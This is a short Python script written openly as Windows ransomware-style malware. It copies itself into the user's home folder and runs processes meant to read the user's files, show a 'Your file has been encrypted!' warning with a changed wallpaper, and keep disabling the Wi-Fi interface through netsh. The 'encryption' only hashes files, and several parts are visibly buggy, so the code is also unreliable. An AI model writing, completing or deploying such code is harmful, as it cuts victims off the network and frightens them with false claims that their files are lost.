import shutil
import os
import hashlib
import ctypes
import subprocess, re
import socket
import time
from multiprocessing import Process


main_file_directory = os.getcwd()
user_name = os.getenv('username')
destination_directory = "C://Users//" + user_name
destination_directory_under = destination_directory
sha_256 = hashlib.sha256


def warning():
    wall_paper_file = "bg.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_paper_file , 3)
    ctypes.windll.user32.MessageBoxW(0, "Your file has been encrypted!", "Warning", 0)

def encryption(file_list):
    h  = hashlib.sha256()
    b  = bytearray(128*1024)
    mv = memoryview(b)
    for filename in file_list:
        with open(filename, 'rb', buffering=0) as f:
            for n in iter(lambda : f.readinto(mv), 0):
                h.update(mv[:n])
        exit()

def wifi_scraper():
    ssid = re.search('(?<=: ).*', re.search(r'(?<=\n) *SSID.*(?=\r\n)', subprocess.check_output('netsh wlan show interfaces', creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')).group()).group()
    return ssid

def offline_maker(wifi):
    def connection_checking():
        try:
            host = socket.gethostbyname("www.google.com")
            s = socket.create_connection((host, 80), 2)
            return True
        except:
            pass
        return False
    try:
        os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")
    except:
        pass

    while True:
        connection = connection_checking()
        if connection == False:
            time.sleep(6)
        elif connection == True: 
            try:
                os.system("netsh interface set interface name = " + wifi + "admin=DISABLED")
            except:
                pass

if main_file_directory is not destination_directory:
    shutil.copy(main_file_directory,destination_directory)
    exit()

elif main_file_directory is destination_directory:
    #start infecting the virus
    sub_directory_list = os.listdir()
    wifi_name = wifi_scraper()

    try:
        if __name__ == "__main__":

            encryption_process = Process(target = encryption)
            encryption_process.start(sub_directory_list)

            warning_process = Process(target = warning)
            warning_process.start()

            offline_maker_process = Process(target = offline_maker)
            offline_maker_process.start(wifi_name)

        #offline_maker(wifi_name)
        #encryption(sub_directory_list)
        #warning()
    except:
        pass
